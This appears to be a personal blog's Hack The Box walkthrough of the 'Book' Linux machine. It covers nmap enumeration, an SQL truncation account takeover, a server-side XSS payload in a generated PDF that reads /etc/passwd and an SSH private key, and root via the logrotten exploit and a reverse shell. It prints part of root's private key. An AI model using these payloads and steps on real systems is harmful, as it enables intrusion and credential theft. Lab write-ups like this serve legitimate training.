@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title>Book</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+
+    <link rel="stylesheet" href="/css/style.css">
+
+
+
+
+    <!-- scripts list from _config.yml -->
+
+    <script src="/js/script.js"></script>
+
+    <script src="/js/tocbot.min.js"></script>
+
+
+
+
+
+
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div class="wrapper">
+      <header>
+  <nav class="navbar">
+      <div class="container">
+          <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+          <div class="menu navbar-right">
+
+                  <a class="menu-item" href="/archives">Posts</a>
+
+                  <a class="menu-item" href="/category">Categories</a>
+
+                  <a class="menu-item" href="/tag">Tags</a>
+
+
+              <input id="switch_default" type="checkbox" class="switch_default">
+              <label for="switch_default" class="toggleBtn"></label>
+          </div>
+      </div>
+  </nav>
+
+
+  <nav class="navbar-mobile" id="nav-mobile">
+      <div class="container">
+          <div class="navbar-header">
+              <div>
+                  <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+              </div>
+              <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+          </div>
+          <div class="menu" id="mobile-menu">
+
+                  <a class="menu-item" href="/archives">Posts</a>
+
+                  <a class="menu-item" href="/category">Categories</a>
+
+                  <a class="menu-item" href="/tag">Tags</a>
+
+
+          </div>
+      </div>
+  </nav>
+
+</header>
+<script>
+  var mobileBtn = function f() {
+      var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+      var mobileMenu = document.getElementById("mobile-menu");
+      if(toggleMenu.classList.contains("active")){
+         toggleMenu.classList.remove("active")
+          mobileMenu.classList.remove("active")
+      }else{
+          toggleMenu.classList.add("active")
+          mobileMenu.classList.add("active")
+      }
+  }
+</script>
+      <div class="main">
+          <div class="container">
+
+
+      <div class="post-toc">
+  <div class="tocbot-list">
+  </div>
+  <div class="tocbot-list-menu">
+      <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+      <a onclick="go_top()">Back to top</a>
+      <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+  document.ready(
+      function () {
+          tocbot.init({
+              tocSelector: '.tocbot-list',
+              contentSelector: '.post-content',
+              headingSelector: 'h1, h2, h3, h4, h5',
+              collapseDepth: 1,
+              orderedList: false,
+              scrollSmooth: true,
+          })
+      }
+  )
+
+  function expand_toc() {
+      var b = document.querySelector(".tocbot-toc-expand");
+      tocbot.init({
+          tocSelector: '.tocbot-list',
+          contentSelector: '.post-content',
+          headingSelector: 'h1, h2, h3, h4, h5',
+          collapseDepth: 6,
+          orderedList: false,
+          scrollSmooth: true,
+      });
+      b.setAttribute("onclick", "collapse_toc()");
+      b.innerHTML = "Collapse all"
+  }
+
+  function collapse_toc() {
+      var b = document.querySelector(".tocbot-toc-expand");
+      tocbot.init({
+          tocSelector: '.tocbot-list',
+          contentSelector: '.post-content',
+          headingSelector: 'h1, h2, h3, h4, h5',
+          collapseDepth: 1,
+          orderedList: false,
+          scrollSmooth: true,
+      });
+      b.setAttribute("onclick", "expand_toc()");
+      b.innerHTML = "Expand all"
+  }
+
+  function go_top() {
+      window.scrollTo(0, 0);
+  }
+
+  function go_bottom() {
+      window.scrollTo(0, document.body.scrollHeight);
+  }
+
+</script>
+
+
+
+  <article class="post-wrap">
+      <header class="post-header">
+          <h1 class="post-title">Book</h1>
+
+              <div class="post-meta">
+
+
+
+
+                      <span class="post-category">
+                  Category:
+
+                              <a href="/categories/Hackthebox/">Hackthebox</a>
+
+                      </span>
+
+              </div>
+
+      </header>
+
+      <div class="post-content">
+          <h3 id="book"><a href="#book" class="headerlink" title="book"></a>Book - K3nX</h3><ul>
+<li>Book is Medium Linux Machine and IP address is 10.10.10.176 <br><img src="infocard.png" alt="Sample Image"></li>
+</ul>
+<ul>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">#nmap -sSV -O -A -T4 10.10.10.176
+Nmap scan report for 10.10.10.176
+Host is up (0.95s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
+|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
+|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: LIBRARY - Read | Learn | Have Fun
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/26%OT=22%CT=1%CU=33576%PV=Y%DS=2%DC=T%G=Y%TM=5EA587D
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
+OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   805.67 ms 10.10.16.1
+2   396.16 ms 10.10.10.176
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 129.98 seconds
+
+</code></pre>
+<p>Nmap Result Show Only Port 80 (Apache httpd) and Port 22 (SSH) are open</p>
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h3><ul>
+<li>Nmap result show port 80 is open let check this, I found this webpage and if you try to access this web page you can find this sign in form <br><img src="webpage.png" alt="Sample Image">
+</li>
+<li><p>I used gobuster to find some dir , I found many dir but i found nothing interesting</p>
+</li>
+<li><p>In this time, I checked source code  I found one interesting in source code <img src="source.png" alt="Sample Image"></p>
+</li>
+<li><p>It's look like there is a limit on the name and email fields , I create an account and see the web page from the inside . I found several interesting parts , this is "Contact Us".<br><img src="contact.png" alt="Sample Image"></p>
+</li>
+<li><p>In this webpage , I found admin email , admin@book.htb </p>
+</li>
+<li><p>In Previous , I know the limit on the email field , I think it's may be SQL Truncation attack </p>
+</li>
+</ul>
+<ul>
+<h3 id="sqltruncation"><a href="#sqltruncation" class="headerlink" title="SQL Truncation"></a>SQL Truncation</h3>
+<li><p>
+This SQL truncation attack is based on the behaviour of the server when managing
+special characters like spaces. In this case if you send as email "admin@book.htb     a"
+(notice the spaces and the fact the string email length is less than 20), the database is going to
+check if any user already has the email "admin@book.htb     a", and, if no-one has it, it is
+going to cut the username (up to the max 20chars allowed), delete the spaces (MySQL
+behaviour) and save a new entry with it.
+</p></li>
+<li><p> You can easily change the password of the admin user  with this way </p></li>
+<li><p>I changed admin as admin password <br><img src="changepassword.png" alt="Sample Image"></p></li>
+<h3 id="xsslocalfile"><a href="#xsslocalfile" class="headerlink" title="xsslocalfile"></a>XSS to Local File Read </h3></li>
+<li><p>Now I get admin access</p></li>
+<img src="admin.png" alt="Sample Image">
+<li><p>I found one interesting this is <b>Collection</b></p>
+<img src="collection.png" alt="Sample Image">
+</li>
+<li><p>I think Those PDF links will download a PDF with the name of the Users or with the name of the Collections</p>
+</li>
+<li><p>This PDF is dynamically creted , we can control the part of input <br> I think this may be perform Server Side XSS (Dynamic PDF)</p>
+</li>
+<a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">XSS to Local File Read</a>
+<br>
+<a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">Server Side XSS</a>
+</ul>
+<ul>
+<li><p>This is My Payload</p></li>
+<pre><code class="bash">
+#< script>x=new
+XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();< /script>
+</code></pre>
+</li>
+<li><p>Upload the payload in the both field of book and author and select any file to upload<br><img src="upload.png" alt="Sample Image"></p>
+</li>
+<li><p>After uploading , you can download file on admin panel Collection</p></li>
+<li><p>I got the pdf with this /etc/passwd contents <img src="passpdf.png" alt="Sample Image"><p>
+</li>
+</ul>
+<h3 id="user"><a href="#user" class="headerlink" title="user"></a>User</h3><ul>
+<li><p>I found user is reader , We need to try /home/reader/.ssh/id_rsa</p></li>
+<li><p>I changed /home/reader/.ssh/id_rsa instead of /etc/passwd in previous XSS Payload</p></li>
+<li><p>After uploading and download this pdf , I got reader ssh key<br><img src="useridrsa.png" alt="Sample Image"></p></li>
+<li>I login with this id_rsa , I got user and user.txt <img src="user.png" alt="Sample Image"></li>
+</ul>
+<h3 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink"
+  title="privilege-escalation"></a>Privilege Escalation to root</h3><ul>
+<li><p>I spend a few time on this but i can't found nothing , In this time my friend said check process </p>
+</li>
+<li><p>I upload pspy and i checked some processes. In this time,I found one this is logrotate service</p></li>
+<li><p>This Logrotate service is running as root , I searched on google and found an exploit on github</p></li>
+<a href="https://github.com/whotwagner/logrotten">Logrotten</a>
+</ul>
+<ul>
+<li>I used python simple http server to transfer logrotten.c file and nc
+<br>complie this logrotten.c with gcc </li>
+<img src="transfer.png" alt="Sample Image">
+<li>Now need to run logrotten</li>
+<pre><code class="bash">reader@book:/tmp$ ./logrotten -p ./payload /home/reader/backups/access.log
+</code></pre>
+<li>we need to write into the access.log the log is got rotated</li>
+<pre><code class="bash">
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+reader@book:~/backups$ echo "test" >> access.log
+</code></pre>
+<li>Need to try multiple time to run logrotten and write into the access log</li>
+<li>After running multiple time , I got a shell on my ncat listener</li>
+<pre><code class="bash">
+[root@arch ~/Desktop/htb/Machines/book]# nc -lvnp 9001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.176] 50008
+# cat /root/.ssh/id_rsa
+root@book:~/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
+cFzQxCMM/E8UwLdD0fzUJtDgo4SUuwUmkPc6FXuLrZ+xqJaKoeu7/3WgjNBnRc7E
+z6kgpwnf4GOqpvxx1R1W+atbMkkWn6Ne89ogCUarJFVMEszzuC+14Id83wWSc8uV
+</code></pre>
+<li>I tried first to get root id_rsa file for ssh access</li>
+<li>After getting root id_rsa file and I tried ssh login with this file</li>
+<li>SSH Login Successful and I got root access and root.txt </li>
+<img src="root.png" alt="Sample Image">
+<li>Finally Owned this machine </li>
+
+<b><li>I hope you enjoy this</li>
+<li>Hope you learned something :)</li></b>
+</ul>
+        </div>
+
+
+            <section class="post-copyright">
+
+
+
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+
+
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+
+
+            </section>
+
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+
+
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+
+
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+
+                <a class="prev" rel="prev" href="/hackthebox/machines/servmon">Servmon</a>
+
+
+            <a class="next" rel="next"
+                      href="https://k3nx.github.io/2020/07/reverse_shell/">Reverse Shell Cheat Cheet</a>
+
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
